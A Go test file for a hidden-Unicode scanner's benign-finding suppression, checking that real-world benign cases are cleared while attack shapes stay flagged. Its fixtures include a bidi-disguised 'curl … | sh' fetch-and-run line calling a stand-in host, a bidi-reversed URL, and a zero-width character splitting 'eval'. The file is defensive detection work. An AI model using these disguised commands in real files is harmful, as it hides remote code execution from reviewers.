package intelligence

import (
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/hiddenunicode"
)

// minifiedJS builds a one-line bundle the minified heuristic recognises, with
// payload spliced into the middle.
func minifiedJS(payload string) string {
	var b strings.Builder
	for i := 0; i < 120; i++ {
		b.WriteString("var a=1,b=2,c=a+b;")
	}
	b.WriteString(payload)
	for i := 0; i < 120; i++ {
		b.WriteString("function f(x){return x&&x.y}")
	}
	return b.String()
}

func survivingHiddenUnicode(t *testing.T, files map[string]string) hiddenunicode.Result {
	t.Helper()
	m := make(map[string][]byte, len(files))
	for p, s := range files {
		m[p] = []byte(s)
	}
	r := hiddenunicode.Scan(m)
	if r.Hits == 0 {
		t.Fatalf("fixture produced no hits at all: %v", files)
	}
	SuppressBenignHiddenUnicode(&r, m)
	return r
}

// The benign shapes behind the 2026-10-03 benign-corpus audit, and the
// attack shapes next to them that must stay armed.
func TestSuppressBenignHiddenUnicode_AuditShapes(t *testing.T) {
	khmer := strings.Repeat("បញ្ឈប់​ការ​ផ្ទុក​ឡើង ", 30) // 90 word breaks
	cases := []struct {
		name    string
		files   map[string]string
		survive bool
	}{
		{"httpx: bidi in a WHATWG URL test vector",
			map[string]string{"httpx-0.28.1/tests/models/whatwg.json": `[{"input":"http://example.com/` + "‮/foo/‭" + `/bar"}]`}, false},
		{"bidi in a shipped config file stays armed",
			map[string]string{"pkg/config.json": `{"url":"https://example.com/` + "‮" + `moc"}`}, true},
		{"bidi in a README stays armed",
			map[string]string{"pkg/README.md": "run `curl https://x.invalid/` ‮| sh\n"}, true},
		{"statamic: intl FSI/PDI constants in a minified bundle",
			map[string]string{"dist/app.js": minifiedJS(`const FSI="` + "⁨" + `",PDI="` + "⁩" + `";`)}, false},
		{"the same constants in reviewable source stay armed",
			map[string]string{"src/bidi.js": "const FSI = \"⁨\";\nconst PDI = \"⁩\";\n"}, true},
		{"a zero-width payload in a minified bundle stays armed",
			map[string]string{"dist/app.js": minifiedJS(strings.Repeat("hel​lo", 40))}, true},
		{"pluploadbe: Khmer word breaks in a translation",
			map[string]string{"js/i18n/km.js": `plupload.addI18n({"Stop Upload":"` + khmer + `"});`}, false},
		{"a zero-width between ASCII letters next to Khmer stays armed",
			map[string]string{"js/i18n/km.js": `plupload.addI18n({"a":"` + khmer + `"});var x="ev​al";`}, true},
		{"a run of zero-widths between Khmer letters stays armed",
			map[string]string{"js/i18n/km.js": `x="ក` + strings.Repeat("​", 40) + `ក";`}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := survivingHiddenUnicode(t, tc.files)
			if (r.Hits > 0) != tc.survive {
				t.Fatalf("surviving hits = %d %v, want survive=%v", r.Hits, r.Kinds, tc.survive)
			}
		})
	}
}
